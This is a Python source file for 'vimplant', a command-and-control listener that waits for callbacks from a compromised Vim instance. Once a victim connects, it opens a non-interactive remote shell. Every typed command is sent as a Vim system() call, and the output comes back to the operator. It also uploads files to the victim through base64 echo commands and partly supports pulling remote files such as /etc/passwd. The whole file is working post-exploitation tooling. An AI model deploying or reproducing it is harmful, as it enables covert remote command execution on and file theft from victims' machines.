#!/usr/bin/python
#

from __future__ import print_function
import json
import socket
import sys
import threading
import socketserver
import argparse
import time
import base64
from subprocess import check_output

def get_args():
    parser = argparse.ArgumentParser( description='Start listener for vimplant')
    parser.add_argument( '-p','--port', help='Port to listen for callbacks',required=True)
    args = parser.parse_args()
    return args

thesocket = None

class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):

    def handle(self):
        print(f"[+] Callback received from {self.client_address[0]}. Non-Interactive shell opened.",end="\n>")
        global thesocket
        thesocket = self.request
        while True:
            try:
                data = self.request.recv(4096).decode('utf-8')
            except socket.error:
                print("[!] socket error ")
                break
            if data == '':
                print("[!] socket closed ")
                break
            try:
                decoded = json.loads(data)
                print(decoded[1])
                print("\n>",end="")
            except ValueError:
                print("[!] json decoding failed")
        thesocket = None

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass

def upload_file(command):
    # read a local file and upload it

    # parse command
    # should do error checking for more than 2 arguments and they look like paths
    if len(command.split(" ")) != 3:
        print("put command requires exactly two arguments")
        print("Example: put /etc/passwd ./uploaded_passwd")
        return
    put,local_file,remote_dest = command.split(" ")
    print(f"[*] Uploading {local_file} to {remote_dest}")

    with open(local_file,"rb") as f:
        binary_data = f.read()
        encoded_data = base64.b64encode(binary_data)
        b64_string = encoded_data.decode("utf-8")

    command = f"echo {b64_string} | base64 -d > {remote_dest}"
    formatted_command = f'["ex","let output=system(\'{command}\')"]'
    thesocket.sendall(formatted_command.encode('utf-8'))
    print(f"[+] Uploaded {local_file} to {remote_dest}",end="\n>")
    return 

def download_file(command):
    # read a remote file and save it locally

    get,remote_file,local_dest = command.split(" ")
    print(f"Downloading {remote_file} to {local_dest}")
    command = f"cat {remote_file} | base64 -w 0"
    formatted_command = f'["ex","let output=system(\'{command}\')"]'
    thesocket.sendall(formatted_command.encode('utf-8'))
    time.sleep(1)
    return_output = '["ex","call ch_sendexpr(handle, output)"]'
    thesocket.sendall(return_output.encode('utf-8'))
    print(f"Sorry, download is not really implemented.  Copy the base64 encoded data and decode it locally to retrieve the file.")
    return 

def execute_local(command):
    local_command=command.split("!",1)[1][:-1]
    try:
        out = check_output(local_command.split(" "))
    except:
        print(f"[!] Invalid command: {local_command}",end="\n>")
        return
    print(out.decode("utf-8"),end="\n>")
    return

def execute_remote(command):
    formatted_command = f'["ex","let output=system(\'{command}\')"]'
    #print("sending {0}".format(formatted_command))
    #formatted_command = f'["ex","let output=system(\"{command}\")"]'
    thesocket.sendall(formatted_command.encode('utf-8'))
    time.sleep(2)
    return_output = '["ex","call ch_sendexpr(handle, output)"]'
    thesocket.sendall(return_output.encode('utf-8'))
    return

if __name__ == "__main__":
    args = get_args()
    HOST, PORT = "0.0.0.0", int(args.port)

    server = ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler)
    ip, port = server.server_address

    # Start a thread with the server -- that thread will then start one
    # more thread for each request
    server_thread = threading.Thread(target=server.serve_forever)

    # Exit the server thread when the main thread terminates
    server_thread.daemon = True
    server_thread.start()
    print("[*] Waiting for connection on port {0}".format(PORT))
    while True:
        global download 
        download = False
        if thesocket is not None:
            command = sys.stdin.readline()
            if command == "exit\n":
                print("[!] Goodbye!")
                formatted_command = '["call","ch_close(handle)"]'
                try:
                    thesocket.sendall(formatted_command.encode('utf-8'))
                    time.sleep(3)
                except:
                    print("[!] Looks like the client already disconnected")
                server.shutdown()
                server.server_close()
                sys.exit()
            elif command == "help\n":
                print("vimplant help")
                print("\t exit - close the connection")
                print("\t put <local_file> <remote_destination> - upload a local file")
                #print("\t get <remote_file> <local_destination> - download a remote file")
                print("\t !<local_command> - execute a local command",end="\n>")
                continue
            elif command.startswith("put ") or command == "put\n":
                upload_file(command)
                continue
#            elif command.startswith("get ") or command == "get\n":
#                download_file(command)
#                continue
            elif command.startswith("!"):
                execute_local(command)
                continue
            else:
                execute_remote(command)
                continue
            continue
